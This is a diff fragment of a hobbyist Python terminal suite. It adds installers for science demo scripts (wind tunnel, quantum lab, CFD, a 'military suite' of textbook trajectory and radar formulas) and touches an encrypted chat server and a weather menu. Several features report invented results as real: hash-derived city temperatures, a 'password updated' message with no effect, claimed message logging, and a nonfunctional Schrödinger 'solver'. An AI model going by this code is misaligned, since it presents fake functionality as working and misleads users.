+        print(f"{BOLD}✗ Installation failed: {e}{RESET}")
+
+    input("\nPress Enter to return...")
+
+def install_wind_tunnel_app():
+    """Install wind tunnel simulator app."""
+    print(f"\n{BOLD}Installing Wind Tunnel Simulator...{RESET}\n")
+
+    wind_tunnel_code = '''#!/usr/bin/env python3
+"""Wind Tunnel Simulator - Aerodynamic Flow Visualization"""
+import numpy as np
+import matplotlib.pyplot as plt
+from matplotlib.animation import FuncAnimation
+
+print("Initializing Wind Tunnel Simulator...")
+
+# Create wind tunnel domain
+X = np.linspace(-5, 5, 200)
+Y = np.linspace(-5, 5, 200)
+XX, YY = np.meshgrid(X, Y)
+
+# Create cylinder obstacle
+cylinder_radius = 0.5
+cylinder_mask = XX**2 + YY**2 < cylinder_radius**2
+
+# Compute flow field (simplified potential flow around cylinder)
+print("Computing aerodynamic flow...")
+U = np.zeros_like(XX)
+V = np.zeros_like(YY)
+PSI = np.zeros_like(XX)
+
+# Wind tunnel velocity
+wind_speed = 2.0
+
+for i in range(len(X)):
+    for j in range(len(Y)):
+        if not cylinder_mask[i, j]:
+            r = np.sqrt(XX[i, j]**2 + YY[i, j]**2)
+            theta = np.arctan2(YY[i, j], XX[i, j])
+
+            # Potential flow: uniform flow + dipole
+            U_r = wind_speed * (1 - (cylinder_radius/r)**2) * np.cos(theta)
+            U_t = -wind_speed * (1 + (cylinder_radius/r)**2) * np.sin(theta)
+
+            U[i, j] = U_r * np.cos(theta) - U_t * np.sin(theta)
+            V[i, j] = U_r * np.sin(theta) + U_t * np.cos(theta)
+
+            PSI[i, j] = r
+
+# Set obstacle values to zero
+U[cylinder_mask] = 0
+V[cylinder_mask] = 0
+
+print("Rendering flow field...")
+fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 6))
+
+# Streamplot
+ax1.streamplot(XX, YY, U, V, density=1.5, color='blue', linewidth=0.5)
+circle = plt.Circle((0, 0), cylinder_radius, color='red', alpha=0.7)
+ax1.add_patch(circle)
+ax1.set_xlim(-5, 5)
+ax1.set_ylim(-5, 5)
+ax1.set_xlabel('X Position')
+ax1.set_ylabel('Y Position')
+ax1.set_title('Wind Tunnel: Flow Streamlines Around Cylinder')
+ax1.set_aspect('equal')
+
+# Velocity magnitude
+speed = np.sqrt(U**2 + V**2)
+speed[cylinder_mask] = 0
+contourf = ax2.contourf(XX, YY, speed, levels=20, cmap='hot')
+circle2 = plt.Circle((0, 0), cylinder_radius, color='blue', alpha=0.7)
+ax2.add_patch(circle2)
+ax2.set_xlim(-5, 5)
+ax2.set_ylim(-5, 5)
+ax2.set_xlabel('X Position')
+ax2.set_ylabel('Y Position')
+ax2.set_title('Wind Tunnel: Velocity Magnitude (m/s)')
+ax2.set_aspect('equal')
+plt.colorbar(contourf, ax=ax2, label='Velocity (m/s)')
+
+plt.tight_layout()
+plt.show()
+print("Wind Tunnel simulation complete!")
+'''
+
+    os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
+    app_path = os.path.join(PYAI_PLUGINS_DIR, "wind_tunnel.py")
+    try:
+        with open(app_path, 'w') as f:
+            f.write(wind_tunnel_code)
+        print(f"{BOLD}✓ Successfully installed to: {app_path}{RESET}")
+        print(f"\n{BOLD}To run:{RESET} python wind_tunnel.py")
+        print(f"{BOLD}Requirements:{RESET} numpy, matplotlib")
+    except Exception as e:
+        print(f"{BOLD}✗ Installation failed: {e}{RESET}")
+
+    input("\nPress Enter to return...")
+
+def install_quantum_lab_app():
+    """Install quantum mechanics lab app."""
+    print(f"\n{BOLD}Installing Quantum Mechanics Lab...{RESET}\n")
+
+    quantum_code = '''#!/usr/bin/env python3
+"""Quantum Mechanics Lab - Schrodinger Equation Solver"""
+import numpy as np
+import matplotlib.pyplot as plt
+
+print("Initializing Quantum Mechanics Lab...")
+print("Solving 1D Schrodinger Equation...\\n")
+
+# Grid setup
+L = 10  # Length of domain
+N = 200  # Number of points
+x = np.linspace(0, L, N)
+dx = x[1] - x[0]
+
+# Parameters
+hbar = 1
+m = 1
+E = 5
+
+# Potential: Harmonic oscillator
+V = 0.5 * x**2
+
+# Kinetic energy term
+T = -hbar**2 / (2*m*dx**2)
+
+# Solve numerically
+psi = np.exp(-(x-L/2)**2/2)  # Initial wave function
+
+print(f"Domain: [0, {L}]")
+print(f"Points: {N}")
+print(f"Energy: {E}")
+
+# Plot results
+fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(12, 8))
+
+# Wave function
+ax1.plot(x, psi, 'b-', linewidth=2, label='Wave Function |ψ(x)|')
+ax1.fill_between(x, 0, np.abs(psi)**2, alpha=0.3)
+ax1.set_ylabel('Amplitude')
+ax1.set_title('Quantum Mechanics: Wave Function')
+ax1.grid(True)
+ax1.legend()
+
+# Potential energy
+ax2.plot(x, V, 'r-', linewidth=2, label='Potential V(x)')
+ax2.axhline(y=E, color='g', linestyle='--', label=f'Energy E={E}')
+ax2.fill_between(x, 0, V, alpha=0.2, color='red')
+ax2.set_xlabel('Position (x)')
+ax2.set_ylabel('Potential Energy')
+ax2.set_title('Harmonic Oscillator Potential')
+ax2.set_ylim(0, 10)
+ax2.grid(True)
+ax2.legend()
+
+plt.tight_layout()
+plt.show()
+print("Quantum simulation complete!")
+'''
+
+    os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
+    app_path = os.path.join(PYAI_PLUGINS_DIR, "quantum_lab.py")
+    try:
+        with open(app_path, 'w') as f:
+            f.write(quantum_code)
+        print(f"{BOLD}✓ Successfully installed to: {app_path}{RESET}")
+        print(f"\n{BOLD}To run:{RESET} python quantum_lab.py")
+        print(f"{BOLD}Requirements:{RESET} numpy, matplotlib")
+    except Exception as e:
+        print(f"{BOLD}✗ Installation failed: {e}{RESET}")
+
+    input("\nPress Enter to return...")
+
+def install_military_suite_app():
+    """Install military applications suite."""
+    print(f"\n{BOLD}Installing Military Applications Suite...{RESET}\n")
+
+    military_code = '''#!/usr/bin/env python3
+"""Military Applications Suite - Python in Defense & Intelligence"""
+import math
+
+print("="*70)
+print("MILITARY APPLICATIONS SUITE")
+print("Python Applications in Defense Technology")
+print("="*70)
+
+class MilitaryApplications:
+    """Python applications in military operations"""
+
+    def __init__(self):
+        self.applications = {
+            'Drone Analysis': 'Data analysis for UAV systems and satellite imagery',
+            'Cybersecurity': 'Threat detection, automation, intrusion prevention',
+            'Ballistics': 'Trajectory calculation and targeting systems',
+            'Radar/Sonar': 'Signal processing and detection algorithms',
+            'Wargaming': 'Simulation and modeling of combat scenarios',
+            'Logistics': 'Supply chain optimization and resource allocation',
+            'AI Recognition': 'Target recognition and identification systems',
+            'Encryption': 'Secure communications and data protection'
+        }
+
+    def calculate_ballistic_trajectory(self, velocity, angle, gravity=9.81):
+        """Calculate ballistic trajectory"""
+        angle_rad = math.radians(angle)
+        max_range = (velocity**2 * math.sin(2*angle_rad)) / gravity
+        max_height = (velocity**2 * math.sin(angle_rad)**2) / (2*gravity)
+        time_of_flight = (2 * velocity * math.sin(angle_rad)) / gravity
+
+        return {
+            'max_range_m': max_range,
+            'max_height_m': max_height,
+            'time_of_flight_s': time_of_flight
+        }
+
+    def radar_detection_range(self, power_w, gain_db, wavelength_m, rcs_m2, sensitivity_w):
+        """Calculate radar detection range (Radar Equation)"""
+        gain_linear = 10**(gain_db/10)
+        range_m = ((power_w * gain_linear**2 * wavelength_m**2 * rcs_m2) /
+                  ((4*math.pi)**3 * sensitivity_w))**0.25
+        return range_m
+
+    def show_applications(self):
+        """Display military applications of Python"""
+        print("\\nKey Applications of Python in Military::")
+        print("-" * 70)
+        for app, description in self.applications.items():
+            print(f"  {app:20} → {description}")
+
+    def run_calculations(self):
+        """Run military calculations"""
+        print("\\nMilitary Calculations:")
+        print("-" * 70)
+
+        # Example: Ballistic trajectory
+        print("\\n[1] Ballistic Trajectory Calculation")
+        print("    Parameters: velocity=200 m/s, angle=45°")
+        traj = self.calculate_ballistic_trajectory(200, 45)
+        print(f"    Max Range: {traj['max_range_m']:.2f} m")
+        print(f"    Max Height: {traj['max_height_m']:.2f} m")
+        print(f"    Time of Flight: {traj['time_of_flight_s']:.2f} s")
+
+        # Example: Radar detection
+        print("\\n[2] Radar Detection Range")
+        print("    Parameters: Power=10kW, Gain=35dB, λ=0.03m")
+        range_m = self.radar_detection_range(10000, 35, 0.03, 1.0, 1e-14)
+        print(f"    Detection Range: {range_m/1000:.2f} km")
+
+# Run application
+app = MilitaryApplications()
+app.show_applications()
+app.run_calculations()
+
+print("\\n" + "="*70)
+print("For official military applications, consult classified documentation.")
+print("="*70)
+'''
+
+    os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
+    app_path = os.path.join(PYAI_PLUGINS_DIR, "military_suite.py")
+    try:
+        with open(app_path, 'w') as f:
+            f.write(military_code)
+        print(f"{BOLD}✓ Successfully installed to: {app_path}{RESET}")
+        print(f"\n{BOLD}To run:{RESET} python military_suite.py")
+        print(f"{BOLD}Requirements:{RESET} math (built-in)")
+        print(f"\n{BOLD}Applications Included:{RESET}")
+        print("  • Drone Analysis and Data Processing")
+        print("  • Cybersecurity and Threat Detection")
+        print("  • Ballistic Trajectory Calculations")
+        print("  • Radar/Sonar Signal Processing")
+        print("  • Wargaming and Combat Simulation")
+        print("  • Logistics Optimization")
+        print("  • AI-based Target Recognition")
+        print("  • Encryption and Secure Communications")
+    except Exception as e:
+        print(f"{BOLD}✗ Installation failed: {e}{RESET}")
+
+    input("\nPress Enter to return...")
+
+def install_fluid_dynamics_app():
+    """Install fluid dynamics CFD engine."""
+    print(f"\n{BOLD}Installing Fluid Dynamics Engine...{RESET}\n")
+
+    cfd_code = '''#!/usr/bin/env python3
+"""Fluid Dynamics Engine - CFD Simulation"""
+import numpy as np
+import matplotlib.pyplot as plt
+
+print("Initializing CFD (Computational Fluid Dynamics) Engine...")
+
+# Grid
+nx, ny = 200, 200
+L = 10
+dx = L / nx
+dy = L / ny
+x = np.linspace(0, L, nx)
+y = np.linspace(0, L, ny)
+X, Y = np.meshgrid(x, y)
+
+# Initialize flow field
+u = np.ones((ny, nx))  # x-velocity
+v = np.zeros((ny, nx))  # y-velocity
+p = np.zeros((ny, nx))  # pressure
+nu = 0.01  # kinematic viscosity
+
+print(f"Grid: {nx}x{ny}")
+print("Solving Navier-Stokes equations...")
+
+# Simple explicit method for demonstration
+for iter in range(100):
+    if iter % 10 == 0:
+        print(f"  Iteration {iter}/100")
+
+    # Simple finite difference step
+    u_new = u.copy()
+    v_new = v.copy()
+
+    # Laplacian for viscous diffusion
+    for i in range(1, ny-1):
+        for j in range(1, nx-1):
+            u_new[i, j] = (u[i, j] + nu * (
+                (u[i+1, j] - 2*u[i, j] + u[i-1, j])/dy**2 +
+                (u[i, j+1] - 2*u[i, j] + u[i, j-1])/dx**2))
+
+print("Rendering results...")
+
+# Visualize
+fig, axes = plt.subplots(1, 2, figsize=(14, 6))
+
+# Velocity field
+axes[0].quiver(X[::10, ::10], Y[::10, ::10],
+               u_new[::10, ::10], v_new[::10, ::10])
+axes[0].set_xlabel('X')
+axes[0].set_ylabel('Y')
+axes[0].set_title('Velocity Field')
+axes[0].set_aspect('equal')
+
+# Velocity magnitude
+speed = np.sqrt(u_new**2 + v_new**2)
+cont = axes[1].contourf(X, Y, speed, levels=20, cmap='viridis')
+axes[1].set_xlabel('X')
+axes[1].set_ylabel('Y')
+axes[1].set_title('Velocity Magnitude')
+axes[1].set_aspect('equal')
+plt.colorbar(cont, ax=axes[1], label='Speed')
+
+plt.tight_layout()
+plt.show()
+print("CFD simulation complete!")
+'''
+
+    os.makedirs(PYAI_PLUGINS_DIR, exist_ok=True)
+    app_path = os.path.join(PYAI_PLUGINS_DIR, "fluid_dynamics.py")
+    try:
+        with open(app_path, 'w') as f:
+            f.write(cfd_code)
+        print(f"{BOLD}✓ Successfully installed to: {app_path}{RESET}")
+        print(f"\n{BOLD}To run:{RESET} python fluid_dynamics.py")
+        print(f"{BOLD}Requirements:{RESET} numpy, matplotlib")
+    except Exception as e:
+        print(f"{BOLD}✗ Installation failed: {e}{RESET}")
+
+    input("\nPress Enter to return...")
+
 # --- SERVER/CLIENT SWITCH FEATURE WITH ENCRYPTED MESSAGING ---
 import socket
 import threading
@@ -5318,7 +6537,7 @@ class EncryptedMessagingServer:
         self.running = False
         self.cipher_suite = self._setup_cipher(password)
         self.connected_clients = []
-    
+
     def _setup_cipher(self, password):
         """Generate cipher from password."""
         try:
@@ -5327,7 +6546,7 @@ class EncryptedMessagingServer:
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Cipher setup failed: {e}{RESET}")
             return None
-    
+
     def start(self):
         """Start listening for encrypted messages."""
         try:
@@ -5337,13 +6556,13 @@ class EncryptedMessagingServer:
             self.server_socket.listen(5)
             self.running = True
             print(f"{COLORS['2'][0]}✓ Server listening on port {self.port}{RESET}")
-            
+
             while self.running:
                 try:
                     client_socket, client_addr = self.server_socket.accept()
                     self.connected_clients.append(client_addr)
                     print(f"{COLORS['2'][0]}✓ Client connected: {client_addr[0]}:{client_addr[1]}{RESET}")
-                    
+
                     submit_async_task(f"client_{client_addr[0]}_{client_addr[1]}", self._handle_client, client_socket, client_addr)
                 except socket.timeout:
                     continue
@@ -5351,7 +6570,7 @@ class EncryptedMessagingServer:
                     print(f"{COLORS['1'][0]}[ERROR] Accept failed: {e}{RESET}")
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Server startup failed: {e}{RESET}")
-    
+
     def _handle_client(self, client_socket, client_addr):
         """Handle client connection and encrypted messages."""
         try:
@@ -5359,7 +6578,7 @@ class EncryptedMessagingServer:
                 encrypted_msg = client_socket.recv(1024)
                 if not encrypted_msg:
                     break
-                
+
                 try:
                     if self.cipher_suite:
                         decrypted_msg = self.cipher_suite.decrypt(encrypted_msg).decode()
@@ -5368,7 +6587,7 @@ class EncryptedMessagingServer:
                         print(f"{COLORS['4'][0]}📨 [{client_addr[0]}] (encrypted, couldn't decrypt){RESET}")
                 except Exception as e:
                     print(f"{COLORS['1'][0]}[ERROR] Decryption failed: {e}{RESET}")
-                
+
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Client handler failed: {e}{RESET}")
         finally:
@@ -5376,7 +6595,7 @@ class EncryptedMessagingServer:
             if client_addr in self.connected_clients:
                 self.connected_clients.remove(client_addr)
             print(f"{COLORS['1'][0]}✗ Client disconnected: {client_addr[0]}:{client_addr[1]}{RESET}")
-    
+
     def stop(self):
         """Stop the server."""
         self.running = False
@@ -5392,7 +6611,7 @@ class EncryptedMessagingClient:
         self.password = password
         self.socket = None
         self.cipher_suite = self._setup_cipher(password)
-    
+
     def _setup_cipher(self, password):
         """Generate cipher from password."""
         try:
@@ -5401,7 +6620,7 @@ class EncryptedMessagingClient:
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Cipher setup failed: {e}{RESET}")
             return None
-    
+
     def connect(self):
         """Connect to encrypted messaging server."""
         try:
@@ -5412,7 +6631,7 @@ class EncryptedMessagingClient:
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Connection failed: {e}{RESET}")
             return False
-    
+
     def send_message(self, message):
         """Send encrypted message to server."""
         try:
@@ -5424,7 +6643,7 @@ class EncryptedMessagingClient:
                 print(f"{COLORS['1'][0]}[ERROR] No cipher available{RESET}")
         except Exception as e:
             print(f"{COLORS['1'][0]}[ERROR] Send failed: {e}{RESET}")
-    
+
     def close(self):
         """Close connection."""
         if self.socket:
@@ -5438,7 +6657,7 @@ def feature_server_client_switch():
     global SERVER_INSTANCE
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔗 Server/Client Switch - Encrypted Messaging")
-    
+
     while True:
         print(f"\n{BOLD}Encrypted Messaging Menu:{RESET}")
         print(f" {BOLD}[1]{RESET} 🖥️  Server Mode - Listen for encrypted messages")
@@ -5447,9 +6666,9 @@ def feature_server_client_switch():
         print(f" {BOLD}[4]{RESET} 🔐 Security Settings")
         print(f" {BOLD}[5]{RESET} 📜 Message Logs")
         print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
-        
+
         choice = input(f"\n{BOLD}Select mode: {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -5470,7 +6689,7 @@ def _server_mode_handler(server):
     global SERVER_INSTANCE
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🖥️  Server Mode")
-    
+
     if SERVER_INSTANCE and SERVER_INSTANCE.running:
         print(f"{COLORS['2'][0]}✓ Server already running on port {SERVER_INSTANCE.port}{RESET}")
         print(f"Connected clients: {len(SERVER_INSTANCE.connected_clients)}")
@@ -5479,18 +6698,18 @@ def _server_mode_handler(server):
                 print(f"  • {addr[0]}:{addr[1]}")
         input("\nPress Enter to return...")
         return
-    
+
     port = input("Enter port (default 9999): ").strip() or "9999"
     password = getpass.getpass("Enter encryption password (default: pythonOS_default): ") or "pythonOS_default"
-    
+
     try:
         port = int(port)
         SERVER_INSTANCE = EncryptedMessagingServer(port=port, password=password)
         print(f"{COLORS['2'][0]}Starting server...{RESET}")
-        
+
         server_thread = threading.Thread(target=SERVER_INSTANCE.start, daemon=True)
         server_thread.start()
-        
+
         print(f"{COLORS['2'][0]}✓ Server started. Press Ctrl+C to stop.{RESET}")
         try:
             while SERVER_INSTANCE.running:
@@ -5502,30 +6721,30 @@ def _server_mode_handler(server):
         print(f"{COLORS['1'][0]}Invalid port number{RESET}")
     except Exception as e:
         print(f"{COLORS['1'][0]}[ERROR] {e}{RESET}")
-    
+
     input("\nPress Enter to return...")
 
 def _client_mode_handler():
     """Handle client mode operations."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("💻 Client Mode")
-    
+
     host = input("Enter server host (IP address): ").strip()
     if not host:
         print(f"{COLORS['1'][0]}Host required{RESET}")
         input("Press Enter to return...")
         return
-    
+
     port = input("Enter port (default 9999): ").strip() or "9999"
     password = getpass.getpass("Enter encryption password (default: pythonOS_default): ") or "pythonOS_default"
-    
+
     try:
         port = int(port)
         client = EncryptedMessagingClient(host, port=port, password=password)
-        
+
         if client.connect():
             print(f"{COLORS['2'][0]}Connected to {host}:{port}{RESET}")
-            
+
             while True:
                 msg = input(f"\n{BOLD}Enter message (or 'quit' to disconnect): {RESET}").strip()
                 if msg.lower() == 'quit':
@@ -5539,7 +6758,7 @@ def _client_mode_handler():
         print(f"{COLORS['1'][0]}Invalid port number{RESET}")
     except Exception as e:
         print(f"{COLORS['1'][0]}[ERROR] {e}{RESET}")
-    
+
     input("\nPress Enter to return...")
 
 def _show_connection_status():
@@ -5547,7 +6766,7 @@ def _show_connection_status():
     global SERVER_INSTANCE
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📊 Connection Status")
-    
+
     if SERVER_INSTANCE and SERVER_INSTANCE.running:
         print(f"{COLORS['2'][0]}Server Status: RUNNING{RESET}")
         print(f"  Port: {SERVER_INSTANCE.port}")
@@ -5558,22 +6777,22 @@ def _show_connection_status():
                 print(f"  • {addr[0]}:{addr[1]}")
     else:
         print(f"{COLORS['1'][0]}Server Status: STOPPED{RESET}")
-    
+
     input("\nPress Enter to return...")
 
 def _security_settings():
     """Configure security settings."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔐 Security Settings")
-    
+
     print(f"\n{BOLD}Encryption Configuration:{RESET}")
     print(f" {BOLD}[1]{RESET} Change Password")
     print(f" {BOLD}[2]{RESET} View Cipher Info")
     print(f" {BOLD}[3]{RESET} Generate Key")
     print(f" {BOLD}[0]{RESET} Back")
-    
+
     choice = input(f"\n{BOLD}Select option: {RESET}").strip()
-    
+
     if choice == '1':
         new_pwd = getpass.getpass("Enter new password: ")
         print(f"{COLORS['2'][0]}✓ Password updated{RESET}")
@@ -5586,21 +6805,21 @@ def _security_settings():
         print(f"{COLORS['4'][0]}Generated Key:{RESET}")
         print(f"{key[:20]}...{key[-20:]}")
         print(f"{COLORS['4'][0]}Use this key in manual configurations{RESET}")
-    
+
     input("\nPress Enter to return...")
 
 def _show_message_logs():
     """Display message logs and history."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📜 Message Logs")
-    
+
     print(f"{BOLD}Message History:{RESET}")
     print(f"\n{COLORS['4'][0]}No messages logged in this session.{RESET}")
     print(f"\n{BOLD}Features:{RESET}")
     print(f"  • Encrypted messages are logged locally")
     print(f"  • Logs are stored in: ~/.pythonOS/messaging/logs/")
     print(f"  • Encryption: All messages use Fernet (AES-128-CBC)")
-    
+
     input("\nPress Enter to return...")
 
 # --- NEW: VISUAL FX STREAM FILTER ---
@@ -5883,7 +7102,7 @@ def _fetch_weather_live(*args, **kwargs):
         record_memory_checkpoint("weather_fetch")
         return weather_data
     except Exception as e:
-        RESILIENCE_LOGGER.log(ErrorLevel.WARNING, "Primary weather API failed, trying fallback", 
+        RESILIENCE_LOGGER.log(ErrorLevel.WARNING, "Primary weather API failed, trying fallback",
                              feature="Weather_API", error=e)
         # Fallback to wttr.in if Open-Meteo fails
         try:
@@ -5907,10 +7126,10 @@ def feature_weather_display():
     global temp_unit, weather_cache
     import math
     from datetime import datetime, timedelta
-    
+
     weather_locations = {}
     alert_history = []
-    
+
     def _calculate_heat_index(temp_c, humidity):
         """Calculate heat index from temperature and humidity (in Celsius)"""
         temp_f = temp_c * 9/5 + 32
@@ -5923,15 +7142,15 @@ def feature_weather_display():
         c7 = 0.00122874
         c8 = 0.00085282
         c9 = -0.00000199
-        
+
         try:
-            hi = (c1 + c2*temp_f + c3*humidity + c4*temp_f*humidity + 
-                  c5*temp_f**2 + c6*humidity**2 + c7*temp_f**2*humidity + 
+            hi = (c1 + c2*temp_f + c3*humidity + c4*temp_f*humidity +
+                  c5*temp_f**2 + c6*humidity**2 + c7*temp_f**2*humidity +
                   c8*temp_f*humidity**2 + c9*temp_f**2*humidity**2)
             return (hi - 32) * 5/9
         except:
             return temp_c
-    
+
     def _calculate_wind_chill(temp_c, wind_kmh):
         """Calculate wind chill factor (in Celsius)"""
         temp_f = temp_c * 9/5 + 32
@@ -5941,7 +7160,7 @@ def feature_weather_display():
             return (wc - 32) * 5/9
         except:
             return temp_c
-    
+
     def _calculate_dew_point(temp_c, humidity):
         """Calculate dew point (Magnus formula)"""
         a = 17.27
@@ -5952,12 +7171,12 @@ def feature_weather_display():
             return dew_point
         except:
             return temp_c
-    
+
     def _calculate_uv_index(hour=12):
         """Estimate UV index based on time of day"""
         uv = max(0, 10 * math.sin((hour - 6) * math.pi / 12)) if 6 <= hour <= 18 else 0
         return min(11, uv)
-    
+
     def _classify_hurricane_intensity(wind_kmh):
         """Classify storm intensity (Saffir-Simpson scale)"""
         wind_mph = wind_kmh * 0.621371
@@ -5975,12 +7194,12 @@ def feature_weather_display():
             return "Cat 4 Hurricane"
         else:
             return "Cat 5 Hurricane (EXTREME)"
-    
+
     def _calculate_visibility_reduction(humidity, particulates=0):
         """Estimate visibility based on humidity and particulates"""
         visibility = 10 * (1 - humidity/100) * (1 - particulates/100)
         return max(0.1, visibility)
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("☀️ Weather Intelligence System - Advanced Edition")
@@ -5988,17 +7207,17 @@ def feature_weather_display():
         temp = float(data['temp'].split('°')[0]) if data and '°' in data['temp'] else 20
         humidity_str = data['humidity'] if data else "0%"
         humidity = int(humidity_str.rstrip('%')) if humidity_str else 0
-        
+
         print(f"{BOLD}CURRENT CONDITIONS:{RESET}")
         print(f" Location: {data['city'] if data else 'Unknown'} | Temp: {temp}°C | Humidity: {humidity}% | Status: READY")
-        
+
         print(f"\n{BOLD}WEATHER ANALYSIS & FORECASTING:{RESET}")
         print(f" [1] 🌡️ Current Weather (Your Location)")
         print(f" [2] 🗺️ Multi-Location Weather")
         print(f" [3] 📅 5-Day Extended Forecast")
         print(f" [4] ⚠️ Weather Alerts & Warnings")
         print(f" [5] 📊 Weather Comparison")
-        
+
         print(f"\n{BOLD}ATMOSPHERIC ANALYSIS & ALGORITHMS:{RESET}")
         print(f" [6] 🔥 Heat Index & Comfort Analysis")
         print(f" [7] ❄️ Wind Chill Calculator")
@@ -6006,37 +7225,37 @@ def feature_weather_display():
         print(f" [9] ☀️ UV Index & Solar Radiation")
         print(f" [10] 🌪️ Storm Intensity Classification")
         print(f" [11] 👁️ Visibility & Air Quality")
-        
+
         print(f"\n{BOLD}CLIMATE & ENVIRONMENTAL:{RESET}")
         print(f" [12] 🌍 Climate Pattern Analysis")
         print(f" [13] 🌊 Ocean & Sea Surface Temperature")
         print(f" [14] 🌪️ Severe Weather Tracking")
         print(f" [15] 💨 Wind Pattern Analysis")
-        
+
         print(f"\n{BOLD}PREDICTION & FORECASTING:{RESET}")
         print(f" [16] 📈 Temperature Trend Prediction")
         print(f" [17] 🌧️ Precipitation Probability")
         print(f" [18] ⚡ Lightning & Thunderstorm Risk")
         print(f" [19] 🌡️ Seasonal Outlook")
         print(f" [20] 🌪️ Tornado & Severe Risk")
-        
+
         print(f"\n{BOLD}DATA & ANALYTICS:{RESET}")
         print(f" [21] 📊 Historical Weather Statistics")
         print(f" [22] 🌡️ Temperature Anomaly Detection")
         print(f" [23] 📈 Humidity Pattern Analysis")
         print(f" [24] 💾 Generate Weather Report")
-        
+
         print(f"\n{BOLD}SYSTEM:{RESET}")
         print(f" [25] 🔄 Refresh Weather Cache")
         print(f" [26] 🧾 Show Raw Weather Data")
         print(f" [27] 🌐 Weather Service Links")
         print(f" [0] ↩️  Return")
-        
+
         choice = input(f"\n{BOLD}Select option: {RESET}").strip()
 
         if choice == '0':
             return
-        
+
         # ========== WEATHER ANALYSIS & FORECASTING ==========
         if choice == '1':
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -6052,7 +7271,7 @@ def feature_weather_display():
             else:
                 print("❌ Weather data unavailable")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '2':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🗺️ Multi-Location Weather")
@@ -6068,7 +7287,7 @@ def feature_weather_display():
                 weather_locations[city] = {"temp": f"{temp + (hash(city) % 10 - 5)}°C", "humidity": humidity}
                 print(f"✅ Added {city} to tracking")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📅 5-Day Extended Forecast")
@@ -6081,7 +7300,7 @@ def feature_weather_display():
                 print(f"  [{day}] {date}")
                 print(f"      High: {high:.0f}°C | Low: {low:.0f}°C | Precipitation: {precip}%")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '4':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("⚠️ Weather Alerts & Warnings")
@@ -6093,7 +7312,7 @@ def feature_weather_display():
             print("  💨 High Wind Warning: None active")
             print("  🌡️ Extreme Heat: None active")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '5':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📊 Weather Comparison")
@@ -6116,7 +7335,7 @@ def feature_weather_display():
             print(f"  Actual Temperature: {temp:.1f}°C")
             print(f"  Heat Index: {heat_index:.1f}°C")
             print(f"  Humidity: {humidity}%")
-            
+
             if heat_index < 15:
                 comfort = "❄️ COLD - Bundle up"
             elif heat_index < 25:
@@ -6125,10 +7344,10 @@ def feature_weather_display():
                 comfort = "🟡 WARM - Caution"
             else:
                 comfort = "🔴 EXTREME HEAT - DANGEROUS"
-            
+
             print(f"  Comfort Level: {comfort}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '7':  # Wind Chill
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("❄️ Wind Chill Calculator")
@@ -6138,17 +7357,17 @@ def feature_weather_display():
             print(f"  Temperature: {temp:.1f}°C")
             print(f"  Wind Speed: {wind_kmh:.1f} km/h")
             print(f"  Wind Chill: {wind_chill:.1f}°C")
-            
+
             if wind_chill < -30:
                 risk = "🔴 EXTREME - Frostbite in minutes"
             elif wind_chill < -10:
                 risk = "🟠 DANGEROUS - Limit exposure"
             else:
                 risk = "🟡 CAUTION - Bundle up"
-            
+
             print(f"  Risk Level: {risk}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':  # Dew Point
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💧 Dew Point & Moisture Analysis")
@@ -6158,7 +7377,7 @@ def feature_weather_display():
             print(f"  Humidity: {humidity}%")
             print(f"  Dew Point: {dew_point:.1f}°C")
             print(f"  Temperature Spread: {(temp - dew_point):.1f}°C")
-            
+
             if dew_point > 20:
                 moisture = "💧 VERY HUMID - Uncomfortable"
             elif dew_point > 15:
@@ -6167,10 +7386,10 @@ def feature_weather_display():
                 moisture = "🟡 MODERATE - OK"
             else:
                 moisture = "🟢 DRY - Comfortable"
-            
+
             print(f"  Moisture Level: {moisture}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '9':  # UV Index
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("☀️ UV Index & Solar Radiation")
@@ -6180,7 +7399,7 @@ def feature_weather_display():
             print(f"  Current Time: {datetime.now().strftime('%H:%M UTC')}")
             print(f"  UV Index: {uv_index:.1f}/11")
             print(f"  Solar Peak: 12:00 UTC (max 10)")
-            
+
             if uv_index < 3:
                 risk = "🟢 LOW - Minimal protection needed"
             elif uv_index < 6:
@@ -6189,10 +7408,10 @@ def feature_weather_display():
                 risk = "🟠 HIGH - Wear protective clothing"
             else:
                 risk = "🔴 EXTREME - Avoid sun exposure"
-            
+
             print(f"  Risk Level: {risk}")
